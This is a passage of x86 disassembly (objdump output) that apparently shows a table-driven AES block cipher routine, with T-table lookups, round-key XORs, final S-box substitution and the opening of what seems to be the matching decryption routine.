  402edf:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  402ee3:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  402ee7:	8b c1                	mov    %ecx,%eax
  402ee9:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  402eed:	c1 e8 18             	shr    $0x18,%eax
  402ef0:	c1 e9 10             	shr    $0x10,%ecx
  402ef3:	23 cd                	and    %ebp,%ecx
  402ef5:	33 3c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%edi
  402efc:	0f b6 c3             	movzbl %bl,%eax
  402eff:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402f06:	c1 eb 18             	shr    $0x18,%ebx
  402f09:	33 3c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%edi
  402f10:	8b c7                	mov    %edi,%eax
  402f12:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  402f16:	33 06                	xor    (%esi),%eax
  402f18:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  402f1c:	8b 44 24 18          	mov    0x18(%esp),%eax
  402f20:	c1 e8 08             	shr    $0x8,%eax
  402f23:	23 c5                	and    %ebp,%eax
  402f25:	5f                   	pop    %edi
  402f26:	03 f7                	add    %edi,%esi
  402f28:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402f2f:	33 0c 9d 10 b1 40 00 	xor    0x40b110(,%ebx,4),%ecx
  402f36:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  402f3a:	0f b6 c2             	movzbl %dl,%eax
  402f3d:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402f44:	33 0e                	xor    (%esi),%ecx
  402f46:	03 f7                	add    %edi,%esi
  402f48:	8b 44 24 20          	mov    0x20(%esp),%eax
  402f4c:	48                   	dec    %eax
  402f4d:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  402f51:	89 44 24 20          	mov    %eax,0x20(%esp)
  402f55:	85 c0                	test   %eax,%eax
  402f57:	0f 8f dc fd ff ff    	jg     0x402d39
  402f5d:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402f61:	8b c2                	mov    %edx,%eax
  402f63:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  402f67:	c1 e8 08             	shr    $0x8,%eax
  402f6a:	23 c5                	and    %ebp,%eax
  402f6c:	c1 e9 10             	shr    $0x10,%ecx
  402f6f:	23 cd                	and    %ebp,%ecx
  402f71:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402f78:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402f7f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402f83:	c1 e8 18             	shr    $0x18,%eax
  402f86:	33 0c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ecx
  402f8d:	0f b6 c3             	movzbl %bl,%eax
  402f90:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402f97:	33 0e                	xor    (%esi),%ecx
  402f99:	03 f7                	add    %edi,%esi
  402f9b:	8b 44 24 28          	mov    0x28(%esp),%eax
  402f9f:	c1 e8 08             	shr    $0x8,%eax
  402fa2:	23 c5                	and    %ebp,%eax
  402fa4:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  402fa8:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402fac:	c1 e9 10             	shr    $0x10,%ecx
  402faf:	23 cd                	and    %ebp,%ecx
  402fb1:	8b 0c 8d 10 ad 40 00 	mov    0x40ad10(,%ecx,4),%ecx
  402fb8:	33 0c 85 10 a9 40 00 	xor    0x40a910(,%eax,4),%ecx
  402fbf:	8b c3                	mov    %ebx,%eax
  402fc1:	c1 e8 18             	shr    $0x18,%eax
  402fc4:	33 0c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ecx
  402fcb:	0f b6 c2             	movzbl %dl,%eax
  402fce:	33 0c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ecx
  402fd5:	8b c3                	mov    %ebx,%eax
  402fd7:	33 0e                	xor    (%esi),%ecx
  402fd9:	03 f7                	add    %edi,%esi
  402fdb:	c1 e8 10             	shr    $0x10,%eax
  402fde:	23 c5                	and    %ebp,%eax
  402fe0:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402fe4:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402fe8:	c1 e9 08             	shr    $0x8,%ecx
  402feb:	23 cd                	and    %ebp,%ecx
  402fed:	8b 1c 8d 10 a9 40 00 	mov    0x40a910(,%ecx,4),%ebx
  402ff4:	33 1c 85 10 ad 40 00 	xor    0x40ad10(,%eax,4),%ebx
  402ffb:	8b c2                	mov    %edx,%eax
  402ffd:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403001:	c1 e8 18             	shr    $0x18,%eax
  403004:	c1 ea 10             	shr    $0x10,%edx
  403007:	23 d5                	and    %ebp,%edx
  403009:	c1 e9 08             	shr    $0x8,%ecx
  40300c:	23 cd                	and    %ebp,%ecx
  40300e:	33 1c 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%ebx
  403015:	8b 44 24 28          	mov    0x28(%esp),%eax
  403019:	8b 14 95 10 ad 40 00 	mov    0x40ad10(,%edx,4),%edx
  403020:	33 14 8d 10 a9 40 00 	xor    0x40a910(,%ecx,4),%edx
  403027:	0f b6 c0             	movzbl %al,%eax
  40302a:	33 1c 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%ebx
  403031:	8b 44 24 28          	mov    0x28(%esp),%eax
  403035:	33 1e                	xor    (%esi),%ebx
  403037:	03 f7                	add    %edi,%esi
  403039:	c1 e8 18             	shr    $0x18,%eax
  40303c:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403040:	33 14 85 10 b1 40 00 	xor    0x40b110(,%eax,4),%edx
  403047:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40304b:	0f b6 c0             	movzbl %al,%eax
  40304e:	33 14 85 10 a5 40 00 	xor    0x40a510(,%eax,4),%edx
  403055:	8b c3                	mov    %ebx,%eax
  403057:	33 16                	xor    (%esi),%edx
  403059:	03 f7                	add    %edi,%esi
  40305b:	c1 e8 10             	shr    $0x10,%eax
  40305e:	23 c5                	and    %ebp,%eax
  403060:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  403064:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  40306b:	8b c2                	mov    %edx,%eax
  40306d:	c1 e8 18             	shr    $0x18,%eax
  403070:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  403077:	c1 e0 08             	shl    $0x8,%eax
  40307a:	33 c8                	xor    %eax,%ecx
  40307c:	8b 44 24 14          	mov    0x14(%esp),%eax
  403080:	c1 e8 08             	shr    $0x8,%eax
  403083:	23 c5                	and    %ebp,%eax
  403085:	c1 e1 08             	shl    $0x8,%ecx
  403088:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  40308f:	33 c8                	xor    %eax,%ecx
  403091:	8b 44 24 18          	mov    0x18(%esp),%eax
  403095:	0f b6 c0             	movzbl %al,%eax
  403098:	c1 e1 08             	shl    $0x8,%ecx
  40309b:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4030a2:	33 c8                	xor    %eax,%ecx
  4030a4:	8b c2                	mov    %edx,%eax
  4030a6:	33 0e                	xor    (%esi),%ecx
  4030a8:	03 f7                	add    %edi,%esi
  4030aa:	c1 e8 10             	shr    $0x10,%eax
  4030ad:	23 c5                	and    %ebp,%eax
  4030af:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  4030b3:	0f b6 88 10 a4 40 00 	movzbl 0x40a410(%eax),%ecx
  4030ba:	8b 44 24 18          	mov    0x18(%esp),%eax
  4030be:	c1 e8 18             	shr    $0x18,%eax
  4030c1:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4030c8:	c1 e0 08             	shl    $0x8,%eax
  4030cb:	33 c8                	xor    %eax,%ecx
  4030cd:	8b c3                	mov    %ebx,%eax
  4030cf:	c1 e8 08             	shr    $0x8,%eax
  4030d2:	23 c5                	and    %ebp,%eax
  4030d4:	c1 e1 08             	shl    $0x8,%ecx
  4030d7:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4030de:	33 c8                	xor    %eax,%ecx
  4030e0:	8b 44 24 14          	mov    0x14(%esp),%eax
  4030e4:	0f b6 c0             	movzbl %al,%eax
  4030e7:	c1 e1 08             	shl    $0x8,%ecx
  4030ea:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  4030f1:	33 c8                	xor    %eax,%ecx
  4030f3:	8b 44 24 18          	mov    0x18(%esp),%eax
  4030f7:	c1 e8 10             	shr    $0x10,%eax
  4030fa:	23 c5                	and    %ebp,%eax
  4030fc:	33 0e                	xor    (%esi),%ecx
  4030fe:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  403102:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403106:	0f b6 98 10 a4 40 00 	movzbl 0x40a410(%eax),%ebx
  40310d:	8b 44 24 14          	mov    0x14(%esp),%eax
  403111:	c1 e8 18             	shr    $0x18,%eax
  403114:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  40311b:	c1 e0 08             	shl    $0x8,%eax
  40311e:	33 d8                	xor    %eax,%ebx
  403120:	8b c2                	mov    %edx,%eax
  403122:	c1 e8 08             	shr    $0x8,%eax
  403125:	23 c5                	and    %ebp,%eax
  403127:	c1 e3 08             	shl    $0x8,%ebx
  40312a:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  403131:	33 d8                	xor    %eax,%ebx
  403133:	0f b6 c1             	movzbl %cl,%eax
  403136:	c1 e3 08             	shl    $0x8,%ebx
  403139:	c1 e9 18             	shr    $0x18,%ecx
  40313c:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  403143:	33 d8                	xor    %eax,%ebx
  403145:	8b 44 24 14          	mov    0x14(%esp),%eax
  403149:	c1 e8 10             	shr    $0x10,%eax
  40314c:	23 c5                	and    %ebp,%eax
  40314e:	33 1c 3e             	xor    (%esi,%edi,1),%ebx
  403151:	0f b6 90 10 a4 40 00 	movzbl 0x40a410(%eax),%edx
  403158:	0f b6 81 10 a4 40 00 	movzbl 0x40a410(%ecx),%eax
  40315f:	c1 e0 08             	shl    $0x8,%eax
  403162:	33 d0                	xor    %eax,%edx
  403164:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  403168:	8b 44 24 18          	mov    0x18(%esp),%eax
  40316c:	c1 e8 08             	shr    $0x8,%eax
  40316f:	23 c5                	and    %ebp,%eax
  403171:	c1 e2 08             	shl    $0x8,%edx
  403174:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  40317b:	33 d0                	xor    %eax,%edx
  40317d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403181:	0f b6 c0             	movzbl %al,%eax
  403184:	c1 e2 08             	shl    $0x8,%edx
  403187:	0f b6 80 10 a4 40 00 	movzbl 0x40a410(%eax),%eax
  40318e:	33 d0                	xor    %eax,%edx
  403190:	8b 44 24 28          	mov    0x28(%esp),%eax
  403194:	33 54 3e 04          	xor    0x4(%esi,%edi,1),%edx
  403198:	88 01                	mov    %al,(%ecx)
  40319a:	c1 e8 08             	shr    $0x8,%eax
  40319d:	88 41 01             	mov    %al,0x1(%ecx)
  4031a0:	8b 44 24 28          	mov    0x28(%esp),%eax
  4031a4:	c1 e8 10             	shr    $0x10,%eax
  4031a7:	88 41 02             	mov    %al,0x2(%ecx)
  4031aa:	8b 44 24 28          	mov    0x28(%esp),%eax
  4031ae:	c1 e8 18             	shr    $0x18,%eax
  4031b1:	88 41 03             	mov    %al,0x3(%ecx)
  4031b4:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4031b8:	88 41 04             	mov    %al,0x4(%ecx)
  4031bb:	c1 e8 08             	shr    $0x8,%eax
  4031be:	88 41 05             	mov    %al,0x5(%ecx)
  4031c1:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4031c5:	c1 e8 10             	shr    $0x10,%eax
  4031c8:	88 41 06             	mov    %al,0x6(%ecx)
  4031cb:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4031cf:	c1 e8 18             	shr    $0x18,%eax
  4031d2:	88 41 07             	mov    %al,0x7(%ecx)
  4031d5:	8b c3                	mov    %ebx,%eax
  4031d7:	c1 e8 08             	shr    $0x8,%eax
  4031da:	88 41 09             	mov    %al,0x9(%ecx)
  4031dd:	8b c3                	mov    %ebx,%eax
  4031df:	c1 e8 10             	shr    $0x10,%eax
  4031e2:	88 41 0a             	mov    %al,0xa(%ecx)
  4031e5:	8b c2                	mov    %edx,%eax
  4031e7:	c1 e8 08             	shr    $0x8,%eax
  4031ea:	88 41 0d             	mov    %al,0xd(%ecx)
  4031ed:	8b c2                	mov    %edx,%eax
  4031ef:	5f                   	pop    %edi
  4031f0:	88 59 08             	mov    %bl,0x8(%ecx)
  4031f3:	c1 eb 18             	shr    $0x18,%ebx
  4031f6:	5e                   	pop    %esi
  4031f7:	c1 e8 10             	shr    $0x10,%eax
  4031fa:	88 51 0c             	mov    %dl,0xc(%ecx)
  4031fd:	c1 ea 18             	shr    $0x18,%edx
  403200:	5d                   	pop    %ebp
  403201:	88 59 0b             	mov    %bl,0xb(%ecx)
  403204:	88 41 0e             	mov    %al,0xe(%ecx)
  403207:	33 c0                	xor    %eax,%eax
  403209:	88 51 0f             	mov    %dl,0xf(%ecx)
  40320c:	5b                   	pop    %ebx
  40320d:	83 c4 14             	add    $0x14,%esp
  403210:	c2 0c 00             	ret    $0xc
  403213:	83 ec 10             	sub    $0x10,%esp
  403216:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40321a:	8b 54 24 14          	mov    0x14(%esp),%edx
  40321e:	53                   	push   %ebx
  40321f:	55                   	push   %ebp
  403220:	0f b6 59 03          	movzbl 0x3(%ecx),%ebx
  403224:	0f b6 41 02          	movzbl 0x2(%ecx),%eax
  403228:	c1 e3 08             	shl    $0x8,%ebx
  40322b:	0b d8                	or     %eax,%ebx
  40322d:	0f b6 41 01          	movzbl 0x1(%ecx),%eax
  403231:	c1 e3 08             	shl    $0x8,%ebx
  403234:	0b d8                	or     %eax,%ebx
  403236:	0f b6 01             	movzbl (%ecx),%eax
  403239:	c1 e3 08             	shl    $0x8,%ebx
  40323c:	0b d8                	or     %eax,%ebx
  40323e:	0f b6 41 06          	movzbl 0x6(%ecx),%eax
  403242:	56                   	push   %esi
  403243:	8b 72 04             	mov    0x4(%edx),%esi
  403246:	57                   	push   %edi
  403247:	0f b6 79 0b          	movzbl 0xb(%ecx),%edi
  40324b:	c1 e7 08             	shl    $0x8,%edi
  40324e:	33 1e                	xor    (%esi),%ebx
  403250:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  403254:	0f b6 59 07          	movzbl 0x7(%ecx),%ebx
  403258:	c1 e3 08             	shl    $0x8,%ebx
  40325b:	0b d8                	or     %eax,%ebx
  40325d:	0f b6 41 05          	movzbl 0x5(%ecx),%eax
  403261:	c1 e3 08             	shl    $0x8,%ebx
  403264:	0b d8                	or     %eax,%ebx
  403266:	0f b6 41 04          	movzbl 0x4(%ecx),%eax
  40326a:	c1 e3 08             	shl    $0x8,%ebx
  40326d:	0b d8                	or     %eax,%ebx
  40326f:	0f b6 41 0a          	movzbl 0xa(%ecx),%eax
  403273:	0b f8                	or     %eax,%edi
  403275:	0f b6 41 09          	movzbl 0x9(%ecx),%eax
  403279:	c1 e7 08             	shl    $0x8,%edi
  40327c:	0b f8                	or     %eax,%edi
  40327e:	0f b6 41 08          	movzbl 0x8(%ecx),%eax
  403282:	c1 e7 08             	shl    $0x8,%edi
  403285:	0b f8                	or     %eax,%edi
  403287:	0f b6 41 0f          	movzbl 0xf(%ecx),%eax
  40328b:	c1 e0 08             	shl    $0x8,%eax
  40328e:	6a 04                	push   $0x4
  403290:	5d                   	pop    %ebp
  403291:	03 f5                	add    %ebp,%esi
  403293:	89 44 24 24          	mov    %eax,0x24(%esp)
  403297:	0f b6 41 0e          	movzbl 0xe(%ecx),%eax
  40329b:	09 44 24 24          	or     %eax,0x24(%esp)
  40329f:	c1 64 24 24 08       	shll   $0x8,0x24(%esp)
  4032a4:	33 1e                	xor    (%esi),%ebx
  4032a6:	03 f5                	add    %ebp,%esi
  4032a8:	0f b6 41 0d          	movzbl 0xd(%ecx),%eax
  4032ac:	09 44 24 24          	or     %eax,0x24(%esp)
  4032b0:	c1 64 24 24 08       	shll   $0x8,0x24(%esp)
  4032b5:	33 3e                	xor    (%esi),%edi
  4032b7:	03 f5                	add    %ebp,%esi
  4032b9:	0f b6 41 0c          	movzbl 0xc(%ecx),%eax
  4032bd:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4032c1:	0b c8                	or     %eax,%ecx
  4032c3:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  4032c7:	33 0e                	xor    (%esi),%ecx
  4032c9:	bf ff 00 00 00       	mov    $0xff,%edi
  4032ce:	03 f5                	add    %ebp,%esi
  4032d0:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4032d4:	8b 2a                	mov    (%edx),%ebp
  4032d6:	d1 fd                	sar    $1,%ebp
  4032d8:	4d                   	dec    %ebp
  4032d9:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4032dd:	85 ed                	test   %ebp,%ebp
  4032df:	0f 8e 02 02 00 00    	jle    0x4034e7
  4032e5:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4032e9:	8b c2                	mov    %edx,%eax
  4032eb:	c1 e9 08             	shr    $0x8,%ecx
  4032ee:	23 cf                	and    %edi,%ecx
  4032f0:	c1 e8 10             	shr    $0x10,%eax
  4032f3:	23 c7                	and    %edi,%eax
  4032f5:	bf ff 00 00 00       	mov    $0xff,%edi
  4032fa:	8b 0c 8d 10 ba 40 00 	mov    0x40ba10(,%ecx,4),%ecx
  403301:	33 0c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ecx
  403308:	8b c3                	mov    %ebx,%eax
  40330a:	c1 e8 18             	shr    $0x18,%eax
  40330d:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  403314:	8b 44 24 28          	mov    0x28(%esp),%eax
  403318:	0f b6 c0             	movzbl %al,%eax
  40331b:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  403322:	33 0e                	xor    (%esi),%ecx
  403324:	8b 44 24 28          	mov    0x28(%esp),%eax
  403328:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  40332c:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403330:	c1 e9 10             	shr    $0x10,%ecx
  403333:	23 cf                	and    %edi,%ecx
  403335:	c1 e8 08             	shr    $0x8,%eax
  403338:	23 c7                	and    %edi,%eax
  40333a:	8b 0c 8d 10 be 40 00 	mov    0x40be10(,%ecx,4),%ecx
  403341:	33 0c 85 10 ba 40 00 	xor    0x40ba10(,%eax,4),%ecx
  403348:	8b c2                	mov    %edx,%eax
  40334a:	c1 e8 18             	shr    $0x18,%eax
  40334d:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  403354:	0f b6 c3             	movzbl %bl,%eax
  403357:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  40335e:	33 4e 04             	xor    0x4(%esi),%ecx
  403361:	8b 44 24 28          	mov    0x28(%esp),%eax
  403365:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  403369:	8b cb                	mov    %ebx,%ecx
  40336b:	c1 e8 10             	shr    $0x10,%eax
  40336e:	23 c7                	and    %edi,%eax
  403370:	c1 e9 08             	shr    $0x8,%ecx
  403373:	23 cf                	and    %edi,%ecx
  403375:	8b 1c 8d 10 ba 40 00 	mov    0x40ba10(,%ecx,4),%ebx
  40337c:	33 1c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ebx
  403383:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403387:	8b c1                	mov    %ecx,%eax
  403389:	c1 e8 18             	shr    $0x18,%eax
  40338c:	33 1c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ebx
  403393:	0f b6 c2             	movzbl %dl,%eax
  403396:	c1 ea 08             	shr    $0x8,%edx
  403399:	23 d7                	and    %edi,%edx
  40339b:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40339f:	c1 ef 10             	shr    $0x10,%edi
  4033a2:	33 1c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ebx
  4033a9:	81 e7 ff 00 00 00    	and    $0xff,%edi
  4033af:	8b 44 24 28          	mov    0x28(%esp),%eax
  4033b3:	8b 14 95 10 ba 40 00 	mov    0x40ba10(,%edx,4),%edx
  4033ba:	33 5e 08             	xor    0x8(%esi),%ebx
  4033bd:	33 14 bd 10 be 40 00 	xor    0x40be10(,%edi,4),%edx
  4033c4:	bf ff 00 00 00       	mov    $0xff,%edi
  4033c9:	c1 e8 18             	shr    $0x18,%eax
  4033cc:	33 14 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%edx
  4033d3:	0f b6 c1             	movzbl %cl,%eax
  4033d6:	33 14 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%edx
  4033dd:	8b c3                	mov    %ebx,%eax
  4033df:	33 56 0c             	xor    0xc(%esi),%edx
  4033e2:	c1 e8 10             	shr    $0x10,%eax
  4033e5:	8b ca                	mov    %edx,%ecx
  4033e7:	c1 e9 08             	shr    $0x8,%ecx
  4033ea:	23 c7                	and    %edi,%eax
  4033ec:	23 cf                	and    %edi,%ecx
  4033ee:	8b 0c 8d 10 ba 40 00 	mov    0x40ba10(,%ecx,4),%ecx
  4033f5:	33 0c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ecx
  4033fc:	8b 44 24 18          	mov    0x18(%esp),%eax
  403400:	c1 e8 18             	shr    $0x18,%eax
  403403:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  40340a:	8b 44 24 14          	mov    0x14(%esp),%eax
  40340e:	0f b6 c0             	movzbl %al,%eax
  403411:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  403418:	33 4e 10             	xor    0x10(%esi),%ecx
  40341b:	8b 44 24 14          	mov    0x14(%esp),%eax
  40341f:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  403423:	8b ca                	mov    %edx,%ecx
  403425:	c1 e9 10             	shr    $0x10,%ecx
  403428:	23 cf                	and    %edi,%ecx
  40342a:	c1 e8 08             	shr    $0x8,%eax
  40342d:	23 c7                	and    %edi,%eax
  40342f:	8b 3c 8d 10 be 40 00 	mov    0x40be10(,%ecx,4),%edi
  403436:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40343a:	33 3c 85 10 ba 40 00 	xor    0x40ba10(,%eax,4),%edi
  403441:	8b c3                	mov    %ebx,%eax
  403443:	c1 e8 18             	shr    $0x18,%eax
  403446:	33 3c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%edi
  40344d:	0f b6 c1             	movzbl %cl,%eax
  403450:	c1 e9 08             	shr    $0x8,%ecx
  403453:	33 3c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%edi
  40345a:	33 7e 14             	xor    0x14(%esi),%edi
  40345d:	8b 44 24 14          	mov    0x14(%esp),%eax
  403461:	c1 e8 10             	shr    $0x10,%eax
  403464:	89 7c 24 10          	mov    %edi,0x10(%esp)
  403468:	bf ff 00 00 00       	mov    $0xff,%edi
  40346d:	23 cf                	and    %edi,%ecx
  40346f:	23 c7                	and    %edi,%eax
  403471:	8b 0c 8d 10 ba 40 00 	mov    0x40ba10(,%ecx,4),%ecx
  403478:	33 0c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ecx
  40347f:	8b c2                	mov    %edx,%eax
  403481:	c1 e8 18             	shr    $0x18,%eax
  403484:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  40348b:	0f b6 c3             	movzbl %bl,%eax
  40348e:	c1 eb 08             	shr    $0x8,%ebx
  403491:	23 df                	and    %edi,%ebx
  403493:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  40349a:	33 4e 18             	xor    0x18(%esi),%ecx
  40349d:	8b 44 24 18          	mov    0x18(%esp),%eax
  4034a1:	c1 e8 10             	shr    $0x10,%eax
  4034a4:	23 c7                	and    %edi,%eax
  4034a6:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  4034aa:	8b 0c 9d 10 ba 40 00 	mov    0x40ba10(,%ebx,4),%ecx
  4034b1:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4034b5:	33 0c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ecx
  4034bc:	8b 44 24 14          	mov    0x14(%esp),%eax
  4034c0:	c1 e8 18             	shr    $0x18,%eax
  4034c3:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  4034ca:	0f b6 c2             	movzbl %dl,%eax
  4034cd:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  4034d4:	33 4e 1c             	xor    0x1c(%esi),%ecx
  4034d7:	83 c6 20             	add    $0x20,%esi
  4034da:	4d                   	dec    %ebp
  4034db:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4034df:	85 ed                	test   %ebp,%ebp
  4034e1:	0f 8f fe fd ff ff    	jg     0x4032e5
  4034e7:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4034eb:	bd ff 00 00 00       	mov    $0xff,%ebp
  4034f0:	c1 e9 08             	shr    $0x8,%ecx
  4034f3:	8b c2                	mov    %edx,%eax
  4034f5:	c1 e8 10             	shr    $0x10,%eax
  4034f8:	23 cd                	and    %ebp,%ecx
  4034fa:	23 c5                	and    %ebp,%eax
  4034fc:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403500:	c1 ef 10             	shr    $0x10,%edi
  403503:	23 fd                	and    %ebp,%edi
  403505:	8b 0c 8d 10 ba 40 00 	mov    0x40ba10(,%ecx,4),%ecx
  40350c:	33 0c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ecx
  403513:	8b c3                	mov    %ebx,%eax
  403515:	c1 e8 18             	shr    $0x18,%eax
  403518:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  40351f:	8b 44 24 28          	mov    0x28(%esp),%eax
  403523:	0f b6 c0             	movzbl %al,%eax
  403526:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  40352d:	33 0e                	xor    (%esi),%ecx
  40352f:	8b 44 24 28          	mov    0x28(%esp),%eax
  403533:	c1 e8 08             	shr    $0x8,%eax
  403536:	23 c5                	and    %ebp,%eax
  403538:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40353c:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403540:	c1 e9 10             	shr    $0x10,%ecx
  403543:	23 cd                	and    %ebp,%ecx
  403545:	8b 0c 8d 10 be 40 00 	mov    0x40be10(,%ecx,4),%ecx
  40354c:	33 0c 85 10 ba 40 00 	xor    0x40ba10(,%eax,4),%ecx
  403553:	8b c2                	mov    %edx,%eax
  403555:	c1 e8 18             	shr    $0x18,%eax
  403558:	33 0c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ecx
  40355f:	0f b6 c3             	movzbl %bl,%eax
  403562:	33 0c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ecx
  403569:	33 4e 04             	xor    0x4(%esi),%ecx
  40356c:	8b 44 24 28          	mov    0x28(%esp),%eax
  403570:	c1 e8 10             	shr    $0x10,%eax
  403573:	23 c5                	and    %ebp,%eax
  403575:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403579:	8b cb                	mov    %ebx,%ecx
  40357b:	c1 e9 08             	shr    $0x8,%ecx
  40357e:	23 cd                	and    %ebp,%ecx
  403580:	8b 1c 8d 10 ba 40 00 	mov    0x40ba10(,%ecx,4),%ebx
  403587:	33 1c 85 10 be 40 00 	xor    0x40be10(,%eax,4),%ebx
  40358e:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403592:	8b c1                	mov    %ecx,%eax
  403594:	c1 e8 18             	shr    $0x18,%eax
  403597:	33 1c 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%ebx
  40359e:	0f b6 c2             	movzbl %dl,%eax
  4035a1:	c1 ea 08             	shr    $0x8,%edx
  4035a4:	23 d5                	and    %ebp,%edx
  4035a6:	33 1c 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%ebx
  4035ad:	8b 44 24 28          	mov    0x28(%esp),%eax
  4035b1:	8b 14 95 10 ba 40 00 	mov    0x40ba10(,%edx,4),%edx
  4035b8:	33 14 bd 10 be 40 00 	xor    0x40be10(,%edi,4),%edx
  4035bf:	33 5e 08             	xor    0x8(%esi),%ebx
  4035c2:	c1 e8 18             	shr    $0x18,%eax
  4035c5:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4035c9:	33 14 85 10 c2 40 00 	xor    0x40c210(,%eax,4),%edx
  4035d0:	0f b6 c1             	movzbl %cl,%eax
  4035d3:	33 14 85 10 b6 40 00 	xor    0x40b610(,%eax,4),%edx
  4035da:	8b c3                	mov    %ebx,%eax
  4035dc:	33 56 0c             	xor    0xc(%esi),%edx
  4035df:	c1 e8 10             	shr    $0x10,%eax
  4035e2:	23 c5                	and    %ebp,%eax
  4035e4:	89 54 24 10          	mov    %edx,0x10(%esp)
  4035e8:	0f b6 88 10 b5 40 00 	movzbl 0x40b510(%eax),%ecx
